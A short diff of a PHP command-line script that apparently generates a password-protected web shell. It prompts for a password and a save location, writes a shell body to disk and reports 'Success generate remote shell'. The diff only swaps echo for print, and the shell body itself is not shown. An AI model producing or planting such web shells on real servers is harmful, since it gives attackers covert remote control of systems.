@@ -1,11 +1,11 @@
 <?php
-echo "Set Password: ";
+print "Set Password: ";
 $inputs = fopen("php://stdin","r");
 $input = fgets($inputs);
    $password = trim(md5($input));
 fclose($inputs);
 
-echo "Set Location save: ";
+print "Set Location save: ";
 $inputs = fopen("php://stdin","r");
 $input = fgets($inputs);
    $location = trim($input);
@@ -16,6 +16,6 @@ $input = fgets($inputs);
    $fp = fopen($location, 'w');
    fwrite($fp, $body);
    fclose($fp);
-   echo "Success generate remote shell -> ".$location;
+   print "[*] Success generate remote shell -> ".$location;
 fclose($inputs);
 ?>
